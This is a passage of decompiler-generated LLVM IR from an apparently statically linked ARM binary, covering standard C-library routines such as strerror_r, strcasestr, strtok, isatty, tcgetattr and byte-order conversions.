  %v3_15b14 = inttoptr i32 %v2_15b14 to i8*
  %v4_15b14 = load i8, i8* %v3_15b14, align 1
  %v2_15b18 = icmp eq i8 %v4_15b14, 0
  br i1 %v2_15b18, label %bb51, label %bb52

bb51:                                             ; preds = %dec_label_pc_15b14
  store i32 %v6_15aec, i32* @r5, align 4
  store i32 %v9_15aec, i32* @r6, align 4
  ret i32 %v1_15b00

bb52:                                             ; preds = %dec_label_pc_15b14
  %v1_15b24 = add i32 %v0_15b00, 2
  %v1_15b78 = add i32 %tmp, 2
  %v2_15b78 = inttoptr i32 %v1_15b78 to i8*
  br label %dec_label_pc_15b70

dec_label_pc_15b34:                               ; preds = %dec_label_pc_15bd0
  %v3_15b34 = load i8, i8* %v3_15b68.pn.in, align 1
  store i32 %storemerge43, i32* @ip, align 4
  br label %dec_label_pc_15b60.preheader

dec_label_pc_15b60.preheader:                     ; preds = %dec_label_pc_15b34, %dec_label_pc_15b70
  %v0_15b604.in = phi i8 [ %v3_15b34, %dec_label_pc_15b34 ], [ %v3_15b68.pn, %dec_label_pc_15b70 ]
  %v9_15b6013 = icmp eq i8 %v0_15b604.in, %v3_15af0
  br i1 %v9_15b6013, label %dec_label_pc_15b68, label %dec_label_pc_15b40

dec_label_pc_15b40:                               ; preds = %dec_label_pc_15b60.preheader, %dec_label_pc_15b5c
  %v0_15b48 = phi i32 [ %v1_15b5c, %dec_label_pc_15b5c ], [ %storemerge43, %dec_label_pc_15b60.preheader ]
  %v0_15b40.in = phi i8 [ %v3_15b5c, %dec_label_pc_15b5c ], [ %v0_15b604.in, %dec_label_pc_15b60.preheader ]
  %v2_15b40 = icmp eq i8 %v0_15b40.in, 0
  br i1 %v2_15b40, label %dec_label_pc_15bdc, label %dec_label_pc_15b48

dec_label_pc_15b48:                               ; preds = %dec_label_pc_15b40
  %v1_15b48 = add i32 %v0_15b48, 1
  %v2_15b48 = inttoptr i32 %v1_15b48 to i8*
  %v3_15b48 = load i8, i8* %v2_15b48, align 1
  store i32 %v1_15b48, i32* @ip, align 4
  %v9_15b4c = icmp eq i8 %v3_15b48, %v3_15af0
  br i1 %v9_15b4c, label %dec_label_pc_15b68, label %dec_label_pc_15b54

dec_label_pc_15b54:                               ; preds = %dec_label_pc_15b48
  %v2_15b54 = icmp eq i8 %v3_15b48, 0
  br i1 %v2_15b54, label %dec_label_pc_15bdc, label %dec_label_pc_15b5c

dec_label_pc_15b5c:                               ; preds = %dec_label_pc_15b54
  %v1_15b5c = add i32 %v0_15b48, 2
  %v2_15b5c = inttoptr i32 %v1_15b5c to i8*
  %v3_15b5c = load i8, i8* %v2_15b5c, align 1
  store i32 %v1_15b5c, i32* @ip, align 4
  %v9_15b60 = icmp eq i8 %v3_15b5c, %v3_15af0
  br i1 %v9_15b60, label %dec_label_pc_15b68, label %dec_label_pc_15b40

dec_label_pc_15b68:                               ; preds = %dec_label_pc_15b48, %dec_label_pc_15b5c, %dec_label_pc_15b60.preheader
  %v0_15b68 = phi i32 [ %storemerge43, %dec_label_pc_15b60.preheader ], [ %v1_15b48, %dec_label_pc_15b48 ], [ %v1_15b5c, %dec_label_pc_15b5c ]
  %v1_15b68 = add i32 %v0_15b68, 1
  br label %dec_label_pc_15b70

dec_label_pc_15b70:                               ; preds = %bb52, %dec_label_pc_15b68
  %storemerge43 = phi i32 [ %v1_15b68, %dec_label_pc_15b68 ], [ %v1_15b24, %bb52 ]
  %v3_15b68.pn.in = inttoptr i32 %storemerge43 to i8*
  %v3_15b68.pn = load i8, i8* %v3_15b68.pn.in, align 1
  store i32 %storemerge43, i32* @ip, align 4
  %storemerge = icmp eq i8 %v3_15b68.pn, %v4_15b14
  br i1 %storemerge, label %dec_label_pc_15b74, label %dec_label_pc_15b60.preheader

dec_label_pc_15b74:                               ; preds = %dec_label_pc_15b70
  %v1_15b74 = add i32 %storemerge43, 1
  %v2_15b74 = inttoptr i32 %v1_15b74 to i8*
  %v3_15b74 = load i8, i8* %v2_15b74, align 1
  %v4_15b74 = zext i8 %v3_15b74 to i32
  %v3_15b78 = load i8, i8* %v2_15b78, align 1
  %v4_15b78 = zext i8 %v3_15b78 to i32
  %v1_15b7c = add i32 %storemerge43, -1
  %v9_15b80 = icmp eq i8 %v3_15b74, %v3_15b78
  store i32 %v1_15b78, i32* @lr, align 4
  store i32 %v1_15b74, i32* @ip, align 4
  br i1 %v9_15b80, label %dec_label_pc_15b90, label %dec_label_pc_15bd0

dec_label_pc_15b90:                               ; preds = %dec_label_pc_15b74, %dec_label_pc_15b8c
  %v0_15ba8 = phi i32 [ %v1_15bb0, %dec_label_pc_15b8c ], [ %v1_15b78, %dec_label_pc_15b74 ]
  %v0_15ba0 = phi i32 [ %v1_15bac, %dec_label_pc_15b8c ], [ %v1_15b74, %dec_label_pc_15b74 ]
  %v0_15b90 = phi i32 [ %v4_15bc0, %dec_label_pc_15b8c ], [ %v4_15b74, %dec_label_pc_15b74 ]
  %v2_15b90 = icmp eq i32 %v0_15b90, 0
  br i1 %v2_15b90, label %bb53, label %bb54

bb53:                                             ; preds = %dec_label_pc_15b90
  store i32 %v6_15aec, i32* @r5, align 4
  store i32 %v9_15aec, i32* @r6, align 4
  ret i32 %v1_15b7c

bb54:                                             ; preds = %dec_label_pc_15b90
  %v1_15b98 = add i32 %v0_15ba0, 1
  %v2_15b98 = inttoptr i32 %v1_15b98 to i8*
  %v3_15b98 = load i8, i8* %v2_15b98, align 1
  %v1_15b9c = add i32 %v0_15ba8, 1
  %v2_15b9c = inttoptr i32 %v1_15b9c to i8*
  %v3_15b9c = load i8, i8* %v2_15b9c, align 1
  %v4_15b9c = zext i8 %v3_15b9c to i32
  %v9_15ba4 = icmp eq i8 %v3_15b98, %v3_15b9c
  %v1_15bac = add i32 %v0_15ba0, 2
  store i32 %v1_15bac, i32* @ip, align 4
  %v1_15bb0 = add i32 %v0_15ba8, 2
  store i32 %v1_15bb0, i32* @lr, align 4
  br i1 %v9_15ba4, label %dec_label_pc_15bb8, label %dec_label_pc_15bd0

dec_label_pc_15bb8:                               ; preds = %bb54
  %v2_15bb8 = icmp eq i8 %v3_15b98, 0
  br i1 %v2_15bb8, label %bb55, label %dec_label_pc_15b8c

bb55:                                             ; preds = %dec_label_pc_15bb8
  store i32 %v6_15aec, i32* @r5, align 4
  store i32 %v9_15aec, i32* @r6, align 4
  ret i32 %v1_15b7c

dec_label_pc_15b8c:                               ; preds = %dec_label_pc_15bb8
  %v2_15bc0 = inttoptr i32 %v1_15bb0 to i8*
  %v3_15bc0 = load i8, i8* %v2_15bc0, align 1
  %v4_15bc0 = zext i8 %v3_15bc0 to i32
  %v2_15bc4 = inttoptr i32 %v1_15bac to i8*
  %v3_15bc4 = load i8, i8* %v2_15bc4, align 1
  %v9_15bc8 = icmp eq i8 %v3_15bc4, %v3_15bc0
  br i1 %v9_15bc8, label %dec_label_pc_15b90, label %dec_label_pc_15bd0

dec_label_pc_15bd0:                               ; preds = %dec_label_pc_15b8c, %bb54, %dec_label_pc_15b74
  %v0_15bd0 = phi i32 [ %v4_15b78, %dec_label_pc_15b74 ], [ %v4_15bc0, %dec_label_pc_15b8c ], [ %v4_15b9c, %bb54 ]
  %v2_15bd0 = icmp eq i32 %v0_15bd0, 0
  br i1 %v2_15bd0, label %dec_label_pc_15bd8, label %dec_label_pc_15b34

dec_label_pc_15bd8:                               ; preds = %dec_label_pc_15bd0
  store i32 %v6_15aec, i32* @r5, align 4
  store i32 %v9_15aec, i32* @r6, align 4
  ret i32 %v1_15b7c

dec_label_pc_15bdc:                               ; preds = %dec_label_pc_15b00, %dec_label_pc_15b54, %dec_label_pc_15b40
  store i32 %v6_15aec, i32* @r5, align 4
  store i32 %v9_15aec, i32* @r6, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v1_15bb0, { 0, 2, 1 }
  uselistorder i32 %v1_15bac, { 1, 2, 0 }
  uselistorder i32 %v1_15b7c, { 2, 1, 0 }
  uselistorder i8 %v3_15b68.pn, { 1, 0 }
  uselistorder i8* %v3_15b68.pn.in, { 1, 0 }
  uselistorder i32 %storemerge43, { 4, 2, 6, 1, 3, 0, 5 }
  uselistorder i8 %v3_15b5c, { 1, 0 }
  uselistorder i32 %v1_15b5c, { 0, 2, 3, 1 }
  uselistorder i32 %v1_15b00, { 0, 2, 1 }
  uselistorder i8 %v3_15af0, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v9_15aec, { 4, 0, 1, 2, 3 }
  uselistorder i32 %v6_15aec, { 4, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_15bdc, { 1, 2, 0 }
  uselistorder label %dec_label_pc_15b90, { 1, 0 }
  uselistorder label %dec_label_pc_15b70, { 1, 0 }
  uselistorder label %dec_label_pc_15b68, { 1, 0, 2 }
  uselistorder label %dec_label_pc_15b40, { 1, 0 }
  uselistorder label %dec_label_pc_15b60.preheader, { 1, 0 }
}

define i32 @__GI___glibc_strerror_r(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r1, align 4
  store i32 %arg1, i32* @r4, align 4
  %v0_15bec = call i32 @__xpg_strerror_r()
  %v0_15bf0 = load i32, i32* @r4, align 4
  ret i32 %v0_15bf0
}

define i32 @__xpg_strerror_r() local_unnamed_addr {
entry:
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-25 = alloca i32, align 4
  %v3_15bf8 = load i32, i32* @r4, align 4
  %v0_15bfc = load i32, i32* @r0, align 4
  %v0_15c08 = load i32, i32* @r1, align 4
  store i32 %v0_15c08, i32* @r8, align 4
  %v0_15c0c = load i32, i32* @r2, align 4
  store i32 %v0_15c0c, i32* @r6, align 4
  %tmp = icmp ult i32 %v0_15bfc, 125
  br i1 %tmp, label %thread-pre-split.preheader, label %dec_label_pc_15c44

thread-pre-split.preheader:                       ; preds = %entry
  store i32 ptrtoint ([8 x i8]* @global_var_1f6e0.939 to i32), i32* @r5, align 4
  %v2_15c2c3446 = icmp eq i32 %v0_15bfc, 0
  br i1 %v2_15c2c3446, label %bb26, label %dec_label_pc_15c20.lr.ph

dec_label_pc_15c20:                               ; preds = %dec_label_pc_15c20.lr.ph, %bb
  %v2_15c3841 = phi i1 [ %v2_15c383849, %dec_label_pc_15c20.lr.ph ], [ %v2_15c38, %bb ]
  %v1_15c3c40 = phi i32 [ %v0_15c2c.pr48, %dec_label_pc_15c20.lr.ph ], [ %v2_15c28, %bb ]
  %v0_15c2439 = phi i32 [ %v0_15c30547, %dec_label_pc_15c20.lr.ph ], [ %v1_15c24, %bb ]
  %v1_15c24 = add i32 %v0_15c2439, 1
  store i32 %v1_15c24, i32* @r5, align 4
  br i1 %v2_15c3841, label %bb, label %thread-pre-split.loopexit

bb:                                               ; preds = %dec_label_pc_15c20
  %v2_15c28 = add i32 %v1_15c3c40, -1
  %v2_15c2c = icmp eq i32 %v2_15c28, 0
  %v1_15c30 = inttoptr i32 %v1_15c24 to i8*
  %v2_15c30 = load i8, i8* %v1_15c30, align 1
  %v2_15c38 = icmp eq i8 %v2_15c30, 0
  br i1 %v2_15c2c, label %dec_label_pc_15c38, label %dec_label_pc_15c20

thread-pre-split.loopexit:                        ; preds = %dec_label_pc_15c20
  %v1_15c3035 = inttoptr i32 %v1_15c24 to i8*
  %v2_15c3036 = load i8, i8* %v1_15c3035, align 1
  %v2_15c3838 = icmp eq i8 %v2_15c3036, 0
  br label %dec_label_pc_15c20.lr.ph

dec_label_pc_15c20.lr.ph:                         ; preds = %thread-pre-split.loopexit, %thread-pre-split.preheader
  %v2_15c383849 = phi i1 [ %v2_15c3838, %thread-pre-split.loopexit ], [ false, %thread-pre-split.preheader ]
  %v0_15c2c.pr48 = phi i32 [ %v1_15c3c40, %thread-pre-split.loopexit ], [ %v0_15bfc, %thread-pre-split.preheader ]
  %v0_15c30547 = phi i32 [ %v1_15c24, %thread-pre-split.loopexit ], [ ptrtoint ([8 x i8]* @global_var_1f6e0.939 to i32), %thread-pre-split.preheader ]
  br label %dec_label_pc_15c20

dec_label_pc_15c38:                               ; preds = %bb
  br i1 %v2_15c38, label %dec_label_pc_15c44, label %bb26

bb26:                                             ; preds = %thread-pre-split.preheader, %dec_label_pc_15c38
  %v0_15c24.lcssa55 = phi i32 [ %v1_15c24, %dec_label_pc_15c38 ], [ ptrtoint ([8 x i8]* @global_var_1f6e0.939 to i32), %thread-pre-split.preheader ]
  store i32 0, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_15c78

dec_label_pc_15c44:                               ; preds = %dec_label_pc_15c38, %entry
  %v3_15c48 = ashr i32 %v0_15bfc, 31
  %v5_15c5c = bitcast i32* %stack_var_-25 to i8*
  %v6_15c5c = call i32 @_uintmaxtostr(i8* %v5_15c5c, i32 %v0_15bfc, i32 %v3_15c48, i32 -10, i32 0)
  %v1_15c60 = add i32 %v6_15c5c, -14
  store i32 %v1_15c60, i32* @r5, align 4
  store i32 %v1_15c60, i32* @r0, align 4
  store i32 ptrtoint ([15 x i8]* @global_var_1f6d0.941 to i32), i32* @r1, align 4
  store i32 14, i32* @r2, align 4
  %v0_15c70 = call i32 @memcpy()
  store i32 22, i32* %r7.global-to-local, align 4
  %v0_15c78.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_15c78

dec_label_pc_15c78:                               ; preds = %bb26, %dec_label_pc_15c44
  %v0_15c78 = phi i32 [ %v0_15c24.lcssa55, %bb26 ], [ %v0_15c78.pre, %dec_label_pc_15c44 ]
  %v1_15c78 = inttoptr i32 %v0_15c78 to i8*
  %v3_15c7c = call i32 @strlen(i8* %v1_15c78)
  %v0_15c80 = load i32, i32* @r8, align 4
  %v2_15c80 = icmp eq i32 %v0_15c80, 0
  %v1_15c84 = add i32 %v3_15c7c, 1
  store i32 %v1_15c84, i32* @r4, align 4
  br i1 %v2_15c80, label %bb27, label %dec_label_pc_15c78._crit_edge

dec_label_pc_15c78._crit_edge:                    ; preds = %dec_label_pc_15c78
  %v1_15c8c.pre = load i32, i32* @r6, align 4
  br label %bb28

bb27:                                             ; preds = %dec_label_pc_15c78
  br label %bb28

bb28:                                             ; preds = %dec_label_pc_15c78._crit_edge, %bb27
  %v4_15c90 = phi i32 [ %v1_15c8c.pre, %dec_label_pc_15c78._crit_edge ], [ 0, %bb27 ]
  %tmp56 = icmp ugt i32 %v1_15c84, %v4_15c90
  br i1 %tmp56, label %bb29, label %.thread16

bb29:                                             ; preds = %bb28
  store i32 %v4_15c90, i32* @r4, align 4
  store i32 34, i32* %r7.global-to-local, align 4
  br label %.thread16

.thread16:                                        ; preds = %bb28, %bb29
  %v0_15ca014 = phi i32 [ %v4_15c90, %bb29 ], [ %v1_15c84, %bb28 ]
  %v2_15c98 = icmp eq i32 %v0_15ca014, 0
  br i1 %v2_15c98, label %dec_label_pc_15cbc, label %dec_label_pc_15ca0

dec_label_pc_15ca0:                               ; preds = %.thread16
  store i32 %v0_15ca014, i32* @r2, align 4
  %v0_15ca4 = load i32, i32* @r5, align 4
  store i32 %v0_15ca4, i32* @r1, align 4
  store i32 %v0_15c80, i32* @r0, align 4
  %v0_15cac = call i32 @memcpy()
  %v0_15cb0 = load i32, i32* @r8, align 4
  %v1_15cb0 = load i32, i32* @r4, align 4
  %v2_15cb0 = add i32 %v1_15cb0, %v0_15cb0
  %v3_15cb8 = add i32 %v2_15cb0, -1
  %v4_15cb8 = inttoptr i32 %v3_15cb8 to i8*
  store i8 0, i8* %v4_15cb8, align 1
  br label %dec_label_pc_15cbc

dec_label_pc_15cbc:                               ; preds = %.thread16, %dec_label_pc_15ca0
  %v0_15cbc = load i32, i32* %r7.global-to-local, align 4
  %v2_15cbc = icmp eq i32 %v0_15cbc, 0
  br i1 %v2_15cbc, label %dec_label_pc_15ccc, label %dec_label_pc_15cc4

dec_label_pc_15cc4:                               ; preds = %dec_label_pc_15cbc
  %v0_15cc4 = call i32 @__errno_location()
  %v0_15cc8 = load i32, i32* %r7.global-to-local, align 4
  %v2_15cc8 = inttoptr i32 %v0_15cc4 to i32*
  store i32 %v0_15cc8, i32* %v2_15cc8, align 4
  %v0_15ccc.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_15ccc

dec_label_pc_15ccc:                               ; preds = %dec_label_pc_15cbc, %dec_label_pc_15cc4
  %v0_15ccc = phi i32 [ 0, %dec_label_pc_15cbc ], [ %v0_15ccc.pre, %dec_label_pc_15cc4 ]
  store i32 %v3_15bf8, i32* @r4, align 4
  ret i32 %v0_15ccc

; uselistorder directives
  uselistorder i32 %v4_15c90, { 1, 2, 0 }
  uselistorder i32 %v1_15c84, { 1, 0, 2 }
  uselistorder i32 %v1_15c24, { 0, 1, 2, 3, 5, 4 }
  uselistorder i32 %v0_15bfc, { 4, 3, 1, 2, 0 }
  uselistorder i32* %r7.global-to-local, { 2, 3, 4, 0, 1, 5 }
  uselistorder label %dec_label_pc_15ccc, { 1, 0 }
  uselistorder label %dec_label_pc_15cbc, { 1, 0 }
  uselistorder label %.thread16, { 1, 0 }
  uselistorder label %bb28, { 1, 0 }
  uselistorder label %dec_label_pc_15c78, { 1, 0 }
  uselistorder label %bb26, { 1, 0 }
}

define i32 @strcasestr(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg1 to i32
  %v1_15cf416 = inttoptr i32 %arg2 to i8*
  br label %dec_label_pc_15cf4.outer

dec_label_pc_15cf4.outer:                         ; preds = %dec_label_pc_15d5c, %entry
  %v0_15d08.ph = phi i32 [ %v1_15d5c, %dec_label_pc_15d5c ], [ %tmp, %entry ]
  %v2_15cf417 = load i8, i8* %v1_15cf416, align 1
  %v2_15cf819 = icmp eq i8 %v2_15cf417, 0
  br i1 %v2_15cf819, label %dec_label_pc_15d08, label %dec_label_pc_15d10

dec_label_pc_15d08:                               ; preds = %dec_label_pc_15cf4.backedge, %dec_label_pc_15cf4.outer
  ret i32 %v0_15d08.ph

dec_label_pc_15d10:                               ; preds = %dec_label_pc_15cf4.outer, %dec_label_pc_15cf4.backedge
  %v1_15d0025.in = phi i32 [ %v1_15d0025, %dec_label_pc_15cf4.backedge ], [ %arg2, %dec_label_pc_15cf4.outer ]
  %v2_15cf423 = phi i8 [ %v2_15cf4, %dec_label_pc_15cf4.backedge ], [ %v2_15cf417, %dec_label_pc_15cf4.outer ]
  %v2_15cfc24.in.in = phi i8 [ %v2_15cf4, %dec_label_pc_15cf4.backedge ], [ %v2_15cf417, %dec_label_pc_15cf4.outer ]
  %v0_15d1822 = phi i32 [ %v1_15d18, %dec_label_pc_15cf4.backedge ], [ %v0_15d08.ph, %dec_label_pc_15cf4.outer ]
  %v1_15d0025 = add i32 %v1_15d0025.in, 1
  %v1_15d10 = inttoptr i32 %v0_15d1822 to i8*
  %v2_15d10 = load i8, i8* %v1_15d10, align 1
  %v9_15d14 = icmp eq i8 %v2_15cf423, %v2_15d10
  %v1_15d18 = add i32 %v0_15d1822, 1
  br i1 %v9_15d14, label %dec_label_pc_15cf4.backedge, label %dec_label_pc_15d24

dec_label_pc_15cf4.backedge:                      ; preds = %dec_label_pc_15d10, %dec_label_pc_15d24
  %v1_15cf4 = inttoptr i32 %v1_15d0025 to i8*
  %v2_15cf4 = load i8, i8* %v1_15cf4, align 1
  %v2_15cf8 = icmp eq i8 %v2_15cf4, 0
  br i1 %v2_15cf8, label %dec_label_pc_15d08, label %dec_label_pc_15d10

dec_label_pc_15d24:                               ; preds = %dec_label_pc_15d10
  %v2_15cfc24.in = zext i8 %v2_15cfc24.in.in to i32
  %v3_15d10 = zext i8 %v2_15d10 to i32
  %v2_15d1c = mul nuw nsw i32 %v3_15d10, 2
  %v2_15cfc24 = mul nuw nsw i32 %v2_15cfc24.in, 2
  %v2_15d28 = load i32, i32* bitcast (i32** @global_var_28c04.944 to i32*), align 4
  %v2_15d2c = add i32 %v2_15d28, %v2_15d1c
  %v2_15d30 = add i32 %v2_15d28, %v2_15cfc24
  %v1_15d34 = add i32 %v2_15d30, 1
  %v2_15d34 = inttoptr i32 %v1_15d34 to i8*
  %v3_15d34 = load i8, i8* %v2_15d34, align 1
  %v4_15d34 = zext i8 %v3_15d34 to i32
  %v1_15d38 = add i32 %v2_15d2c, 1
  %v2_15d38 = inttoptr i32 %v1_15d38 to i8*
  %v3_15d38 = load i8, i8* %v2_15d38, align 1
  %v4_15d38 = zext i8 %v3_15d38 to i32
  %v3_15d3c = inttoptr i32 %v2_15d2c to i8*
  %v4_15d3c = load i8, i8* %v3_15d3c, align 1
  %v6_15d3c = zext i8 %v4_15d3c to i32
  %v3_15d40 = inttoptr i32 %v2_15d30 to i8*
  %v4_15d40 = load i8, i8* %v3_15d40, align 1
  %v6_15d40 = zext i8 %v4_15d40 to i32
  %v3_15d44 = mul nuw i32 %v4_15d34, 16777216
  %v3_15d48 = mul nuw i32 %v4_15d38, 16777216
  %v4_15d4c = sdiv i32 %v3_15d44, 65536
  %v5_15d4c = or i32 %v6_15d40, %v4_15d4c
  %v4_15d50 = sdiv i32 %v3_15d48, 65536
  %v5_15d50 = or i32 %v4_15d50, %v6_15d3c
  %v9_15d54 = icmp eq i32 %v5_15d4c, %v5_15d50
  br i1 %v9_15d54, label %dec_label_pc_15cf4.backedge, label %dec_label_pc_15d5c

dec_label_pc_15d5c:                               ; preds = %dec_label_pc_15d24
  %v1_15d5c = add i32 %v0_15d08.ph, 1
  %v2_15d60 = icmp eq i8 %v2_15d10, 0
  br i1 %v2_15d60, label %dec_label_pc_15d70, label %dec_label_pc_15cf4.outer

dec_label_pc_15d70:                               ; preds = %dec_label_pc_15d5c
  ret i32 0

; uselistorder directives
  uselistorder i8 %v2_15cf4, { 2, 1, 0 }
  uselistorder i8 %v2_15d10, { 0, 2, 1 }
  uselistorder i32 %v0_15d1822, { 1, 0 }
  uselistorder i32 %v0_15d08.ph, { 2, 0, 1 }
  uselistorder label %dec_label_pc_15cf4.backedge, { 1, 0 }
  uselistorder label %dec_label_pc_15d10, { 1, 0 }
}

define i32 @__GI_strtok(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 ptrtoint (i32* @global_var_2ec68.946 to i32), i32* @r2, align 4
  %v0_15d80 = call i32 @strtok_r()
  %v0_15d84 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_15d84, label %bb, label %bb1

bb:                                               ; preds = %entry
  %v1_15d84 = load i32, i32* @r2, align 4
  %v2_15d84 = load i32, i32* @r8, align 4
  %v3_15d84 = udiv i32 %v2_15d84, 16777216
  %v4_15d84 = mul i32 %v2_15d84, 256
  %v5_15d84 = or i32 %v3_15d84, %v4_15d84
  %v8_15d84 = and i32 %v5_15d84, %v1_15d84
  store i32 %v8_15d84, i32* @lr, align 4
  br label %bb1

bb1:                                              ; preds = %entry, %bb
  ret i32 %v0_15d80

; uselistorder directives
  uselistorder label %bb1, { 1, 0 }
}

define i32 @isatty(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-64 = alloca i32, align 4
  %v2_15d8c = ptrtoint i32* %stack_var_-64 to i32
  store i32 %v2_15d8c, i32* @r1, align 4
  %v0_15d94 = call i32 @__GI_tcgetattr()
  %v1_15d98 = sub i32 1, %v0_15d94
  %v2_15d98 = icmp ult i32 %v0_15d94, 2
  br i1 %v2_15d98, label %bb4, label %bb

bb:                                               ; preds = %entry
  br label %bb4

bb4:                                              ; preds = %entry, %bb
  %v5_15da4 = phi i32 [ %v1_15d98, %entry ], [ 0, %bb ]
  ret i32 %v5_15da4

; uselistorder directives
  uselistorder i32 %v0_15d94, { 1, 0 }
  uselistorder label %bb4, { 1, 0 }
}

define i32 @__GI_tcgetattr() local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %tmp = call i8 @__decompiler_undefined_function_2()
  %stack_var_-39 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %v3_15da8 = load i32, i32* @r4, align 4
  %v6_15da8 = load i32, i32* @r5, align 4
  %v2_15dac = ptrtoint i32* %stack_var_-56 to i32
  %v0_15db0 = load i32, i32* @r1, align 4
  store i32 %v0_15db0, i32* %r6.global-to-local, align 4
  %v0_15dbc = load i32, i32* @r0, align 4
  %v3_15dbc = call i32 @ioctl(i32 %v0_15dbc, i32 21505, i32 %v2_15dac)
  store i32 %v3_15dbc, i32* %r7.global-to-local, align 4
  %v2_15dc0 = icmp eq i32 %v3_15dbc, 0
  %v2_15dc8 = ptrtoint i32* %stack_var_-39 to i32
  store i32 %v2_15dc8, i32* @r1, align 4
  %v0_15dd0 = load i32, i32* %r6.global-to-local, align 4
  br i1 %v2_15dc0, label %dec_label_pc_15dd8, label %dec_label_pc_15e04

dec_label_pc_15dd8:                               ; preds = %entry
  %v1_15dd0 = add i32 %v0_15dd0, 17
  %v4_15de0 = zext i8 %tmp to i32
  store i32 %v4_15de0, i32* @r5, align 4
  %v2_15de4 = load i32, i32* %stack_var_-56, align 4
  %v1_15de8 = inttoptr i32 %v0_15dd0 to i32*
  store i32 %v2_15de4, i32* %v1_15de8, align 4
  %v3_15de8 = add i32 %v0_15dd0, 4
  %v4_15de8 = inttoptr i32 %v3_15de8 to i32*
  %v5_15de8 = load i32, i32* %ip.global-to-local, align 4
  store i32 %v5_15de8, i32* %v4_15de8, align 4
  %v6_15de8 = add i32 %v0_15dd0, 8
  %v7_15de8 = inttoptr i32 %v6_15de8 to i32*
  %v8_15de8 = load i32, i32* @lr, align 4
  store i32 %v8_15de8, i32* %v7_15de8, align 4
  %v0_15dec = load i32, i32* @r4, align 4
  %v1_15dec = load i32, i32* %r6.global-to-local, align 4
  %v2_15dec = add i32 %v1_15dec, 12
  %v3_15dec = inttoptr i32 %v2_15dec to i32*
  store i32 %v0_15dec, i32* %v3_15dec, align 4
  %v0_15df0 = load i32, i32* @r5, align 4
  %v1_15df0 = trunc i32 %v0_15df0 to i8
  %v2_15df0 = load i32, i32* %r6.global-to-local, align 4
  %v3_15df0 = add i32 %v2_15df0, 16
  %v4_15df0 = inttoptr i32 %v3_15df0 to i8*
  store i8 %v1_15df0, i8* %v4_15df0, align 1
  %v4_15df4 = call i32 @__GI_mempcpy(i32 %v1_15dd0, i32 %v2_15dc8, i32 19, i32 %v2_15de4)
  %v0_15df8 = load i32, i32* %r7.global-to-local, align 4
  store i32 13, i32* @r2, align 4
  %v2_15e00 = inttoptr i32 %v4_15df4 to i8*
  %v3_15e00 = call i32 @__GI_memset(i8* %v2_15e00, i32 %v0_15df8)
  br label %dec_label_pc_15e04

dec_label_pc_15e04:                               ; preds = %entry, %dec_label_pc_15dd8
  %v0_15e04 = phi i32 [ %v3_15dbc, %entry ], [ %v0_15df8, %dec_label_pc_15dd8 ]
  store i32 %v3_15da8, i32* @r4, align 4
  store i32 %v6_15da8, i32* @r5, align 4
  ret i32 %v0_15e04

; uselistorder directives
  uselistorder i32 %v0_15dd0, { 2, 1, 0, 3 }
  uselistorder i32 19, { 0, 3, 1, 2 }
  uselistorder i32 (i32, i32, i32)* @ioctl, { 0, 2, 1 }
  uselistorder label %dec_label_pc_15e04, { 1, 0 }
}

define i32 @ntohl(i32 %arg1) local_unnamed_addr {
entry:
  %v2_15e30 = call i32 @llvm.bswap.i32(i32 %arg1)
  ret i32 %v2_15e30
}

define i32 @ntohs(i32 %arg1) local_unnamed_addr {
entry:
  %tmp = mul i32 %arg1, 256
  %v1_15e40 = and i32 %tmp, 65280
  %tmp1 = udiv i32 %arg1, 256
  %v4_15e44 = urem i32 %tmp1, 256
  %v5_15e44 = or i32 %v4_15e44, %v1_15e40
  ret i32 %v5_15e44

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
}

define i32 @htonl(i32 %arg1) local_unnamed_addr {
entry:
  %v2_15e68 = call i32 @llvm.bswap.i32(i32 %arg1)
  ret i32 %v2_15e68
}

define i32 @htons(i32 %arg1) local_unnamed_addr {
entry:
  %tmp = mul i32 %arg1, 256
  %v1_15e78 = and i32 %tmp, 65280
  %tmp1 = udiv i32 %arg1, 256
  %v4_15e7c = urem i32 %tmp1, 256
  %v5_15e7c = or i32 %v4_15e7c, %v1_15e78
  ret i32 %v5_15e7c

; uselistorder directives
  uselistorder i32 65280, { 1, 2, 0, 3 }
  uselistorder i32 %arg1, { 1, 0 }
}

define i32 @hstrerror(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %tmp = icmp ult i32 %arg1, 5
  br i1 %tmp, label %bb, label %bb2

bb:                                               ; preds = %entry
  %v8_15e90 = mul i32 %arg1, 4
  %v9_15e90 = add i32 %v8_15e90, ptrtoint ([5 x i8*]* @global_var_202b0.956 to i32)
  %v10_15e90 = inttoptr i32 %v9_15e90 to i32*
  %v11_15e90 = load i32, i32* %v10_15e90, align 4
  br label %bb2

bb2:                                              ; preds = %entry, %bb
  %v0_15e94 = phi i32 [ ptrtoint ([15 x i8]* @global_var_202c4.949 to i32), %entry ], [ %v11_15e90, %bb ]
  ret i32 %v0_15e94

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %bb2, { 1, 0 }
}

define i32 @__GI_herror(i8* %arg1) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* @r4, align 4
  %v3_15ea8 = icmp eq i8* %arg1, null
  br i1 %v3_15ea8, label %dec_label_pc_15ec4, label %dec_label_pc_15eb4

dec_label_pc_15eb4:                               ; preds = %entry
  %v2_15eb4 = load i8, i8* %arg1, align 1
  %v2_15eb8 = icmp eq i8 %v2_15eb4, 0
  br i1 %v2_15eb8, label %dec_label_pc_15ec4, label %dec_label_pc_15ec8

dec_label_pc_15ec4:                               ; preds = %dec_label_pc_15eb4, %entry
